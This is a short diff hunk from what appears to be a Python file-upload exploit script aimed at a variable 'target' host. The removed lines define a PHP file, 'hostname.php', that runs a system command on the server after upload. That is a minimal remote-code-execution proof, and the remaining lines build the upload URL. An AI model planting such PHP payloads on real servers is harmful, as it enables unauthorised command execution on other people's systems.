@@ -59,10 +59,6 @@ def main():
         # don't set Content-Type here — requests will set the correct multipart boundary
     }
     
-    # ============================ PHP SCRIPT ============================ #
-    php_filename = "hostname.php"
-    php_content = "<?php system('hostname 2>/dev/null');?>"
-    
     # ============================ UPLOAD URL of TARGET ============================ #
     upload_url = f"http://{target}/"
 
